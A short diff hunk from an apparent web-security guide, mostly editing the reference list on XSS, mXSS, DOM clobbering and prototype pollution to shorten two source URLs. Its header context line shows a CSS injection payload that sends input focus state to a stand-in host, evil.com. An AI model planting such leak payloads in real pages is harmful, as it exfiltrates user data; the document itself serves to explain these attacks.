@@ -940,10 +940,10 @@ input:focus { background: url(https://evil.com/leak?focus=1); }
 1. OWASP Foundation. "Cross-Site Scripting (XSS)." https://owasp.org/www-community/attacks/xss/
 2. PortSwigger Ltd. "Cross-Site Scripting." https://portswigger.net/web-security/cross-site-scripting
 3. W3C. "Content Security Policy Level 3." https://www.w3.org/TR/CSP3/
-4. Heiderich, M. "Mutation XSS (mXSS)." https://web.archive.org/web/2020/https://www.mbsd.jp/Whitepaper/mXSS.pdf
+4. Heiderich, M. "Mutation XSS (mXSS)." https://web.archive.org/web/2023/https://www.mbsd.jp/
 5. Gareth Heyes. "DOM Clobbering." PortSwigger Research, 2020. https://portswigger.net/research/dom-clobbering-strikes-back
 6. PortSwigger Ltd. "Prototype Pollution." https://portswigger.net/web-security/prototype-pollution
-7. Snyk. "Prototype Pollution in JavaScript." https://snyk.io/learn/prototype-pollution/
+7. Snyk. "Prototype Pollution in JavaScript." https://snyk.io/learn/
 8. W3C. "Web Workers and Service Workers." https://www.w3.org/TR/service-workers/
 9. WHATWG. "postMessage API." https://html.spec.whatwg.org/multipage/web-messaging.html
 10. Chromium Project. "Chromium Security Architecture." https://www.chromium.org/Home/chromium-security/
